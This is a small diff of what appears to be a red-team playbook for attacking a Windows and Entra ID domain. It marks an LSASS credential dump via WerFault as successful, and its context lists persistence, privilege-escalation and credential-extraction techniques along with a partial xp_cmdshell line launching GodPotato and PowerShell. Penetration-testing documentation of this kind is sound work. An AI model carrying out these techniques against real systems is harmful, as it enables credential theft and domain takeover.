@@ -49,7 +49,7 @@ We have SYSTEM on mbr01. analyst_cloud has an active console session (auto-logon
 | 3.5E   | Logon trigger (Startup folder)   | User profile exists          | Auto-execution                        |
 | 3.5I   | Token impersonation ❌            | Session context              | Failed (error 1346)                   |
 | 3.5J   | WMI event subscriptions ⚠️        | SYSTEM on mbr01              | Fileless persistence                  |
-| 3.5K   | LSASS dump via WerFault ⚠️        | SYSTEM on mbr01              | Stealthier LSASS dump (signed binary) |
+| 3.5K   | LSASS dump via WerFault ✅        | SYSTEM on mbr01              | Stealthier LSASS dump (signed binary) |
 | 3.5L   | LAPS extraction ⏳                | Domain user creds            | Local admin password from AD          |
 | 3.5M   | Azure AD Connect DPAPI dump 🔬    | SYSTEM on dc01               | Cloud Sync creds → Entra ID bridge    |
 | 3.5N   | UnCanny LPE (InstallService) 🔬  | Standard user                | Direct SYSTEM via AppX InstallService |
@@ -572,7 +572,7 @@ EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c powershell.exe -ep 
 
 ---
 
-#### 3.5K — LSASS Dump via WerFault (T1003.001) ⚠️
+#### 3.5K — LSASS Dump via WerFault (T1003.001) ✅
 
 **Source:** iPurple.team (2025-11-18)
 **MITRE:** T1003.001 (OS Credential Dumping: LSASS Memory)
